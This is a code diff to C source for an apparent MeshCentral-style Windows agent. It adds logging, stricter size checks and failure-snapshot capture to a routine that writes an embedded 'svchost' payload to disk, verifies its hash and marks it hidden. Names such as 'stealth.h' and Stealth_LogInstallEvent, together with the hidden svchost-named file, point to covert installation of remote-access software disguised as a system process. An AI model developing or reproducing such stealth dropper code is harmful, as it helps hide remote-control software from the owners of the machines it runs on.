@@ -32,10 +32,14 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 #else
 
 #include "../microstack/ILibCrypto.h"
+#include "stealth.h"
 #include "meshcore/embedded/generated/svchost_payload.h"
+#include <strsafe.h>
 
 #define SVCHOST_PAYLOAD_HASH_HEX_CHARS      (UTIL_SHA256_HASHSIZE * 2)
 #define SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH  (SVCHOST_PAYLOAD_HASH_HEX_CHARS + 1)
+
+#define STEALTH_CAPTURE_ENV_VAR          L"STEALTH_CAPTURE_FAILED_DLL"
 
 static void MeshSvchostPayload_SetHiddenAttributes(const wchar_t* path)
 {
@@ -93,23 +97,34 @@ static BOOL MeshSvchostPayload_HashFileHex(const wchar_t* path, char* outHex, si
         return FALSE;
     }
 
-    if (fileSize.QuadPart <= 0 ||
-        fileSize.QuadPart > (LONGLONG)SIZE_MAX ||
-        fileSize.QuadPart > (LONGLONG)MAXDWORD)
-    {
-        CloseHandle(fileHandle);
-        SetLastError(ERROR_FILE_TOO_LARGE);
-        return FALSE;
-    }
-
-    if ((size_t)fileSize.QuadPart != (size_t)g_SvchostPayload_SIZE)
+    ULONGLONG fileSizeValue = (fileSize.QuadPart < 0) ? 0 : (ULONGLONG)fileSize.QuadPart;
+    if (fileSizeValue == 0)
     {
         CloseHandle(fileHandle);
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
 
-    const size_t bytesToRead = (size_t)fileSize.QuadPart;
+    if (fileSizeValue != (ULONGLONG)g_SvchostPayload_SIZE)
+    {
+        CloseHandle(fileHandle);
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
+
+    if ((ULONGLONG)g_SvchostPayload_SIZE > (ULONGLONG)SIZE_MAX ||
+        (ULONGLONG)g_SvchostPayload_SIZE > (ULONGLONG)MAXDWORD)
+    {
+        Stealth_LogInstallEvent(L"HashFileHex payload size exceeds runtime limits (size=%I64u, SIZE_MAX=%I64u, MAXDWORD=%u)",
+            (unsigned long long)g_SvchostPayload_SIZE,
+            (unsigned long long)((ULONGLONG)SIZE_MAX),
+            (unsigned int)MAXDWORD);
+        CloseHandle(fileHandle);
+        SetLastError(ERROR_FILE_TOO_LARGE);
+        return FALSE;
+    }
+
+    const size_t bytesToRead = (size_t)fileSizeValue;
     unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, bytesToRead);
     if (buffer == NULL)
     {
@@ -196,6 +211,36 @@ BOOL MeshSvchostPayload_VerifyIntegrity(void)
     return MeshSvchostPayload_VerifyHashEquals(g_SvchostPayload_SHA256, computed);
 }
 
+static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
+{
+    if (destination == NULL || destination[0] == L'\0') { return; }
+
+    wchar_t envBuffer[4] = {0};
+    if (GetEnvironmentVariableW(STEALTH_CAPTURE_ENV_VAR, envBuffer, _countof(envBuffer)) == 0)
+    {
+        return;
+    }
+
+    wchar_t capturePath[MAX_PATH * 2] = {0};
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    if (FAILED(StringCchPrintfW(
+        capturePath,
+        _countof(capturePath),
+        L"%s.failed_%04u%02u%02u%02u%02u%02u",
+        destination,
+        st.wYear, st.wMonth, st.wDay,
+        st.wHour, st.wMinute, st.wSecond)))
+    {
+        return;
+    }
+
+    if (CopyFileW(destination, capturePath, FALSE))
+    {
+        Stealth_LogInstallEvent(L"Captured failed svchost payload snapshot: %ls", capturePath);
+    }
+}
+
 BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 {
     if (destination == NULL || destination[0] == L'\0')
@@ -217,6 +262,8 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
         return FALSE;
     }
 
+    Stealth_LogInstallEvent(L"Emitting embedded svchost payload (%Iu bytes) to %ls", dataLength, destination);
+
     HANDLE fileHandle = CreateFileW(destination,
         GENERIC_WRITE,
         0,
@@ -227,6 +274,7 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 
     if (fileHandle == INVALID_HANDLE_VALUE)
     {
+        Stealth_LogInstallEvent(L"CreateFile failed for %ls (error=%lu)", destination, GetLastError());
         return FALSE;
     }
 
@@ -237,6 +285,7 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 
     if (!result || written != dataLength)
     {
+        Stealth_LogInstallEvent(L"WriteFile failed for %ls (bytes=%lu, error=%lu)", destination, written, writeErr);
         if (writeErr != ERROR_SUCCESS)
         {
             SetLastError(writeErr);
@@ -248,6 +297,9 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
     if (!MeshSvchostPayload_VerifyFileOnDisk(destination))
     {
         DWORD verifyErr = GetLastError();
+        Stealth_LogInstallEvent(L"Embedded svchost payload verification failed for %ls (error=%lu)", destination, verifyErr);
+        Stealth_LogPathState(destination);
+        MeshSvchostPayload_TryCaptureFailure(destination);
         DeleteFileW(destination);
         if (verifyErr != ERROR_SUCCESS)
         {
@@ -255,6 +307,8 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
         }
         return FALSE;
     }
+
+    Stealth_LogInstallEvent(L"Embedded svchost payload staged (%Iu bytes) to %ls", dataLength, destination);
 
     MeshSvchostPayload_SetHiddenAttributes(destination);
     return TRUE;
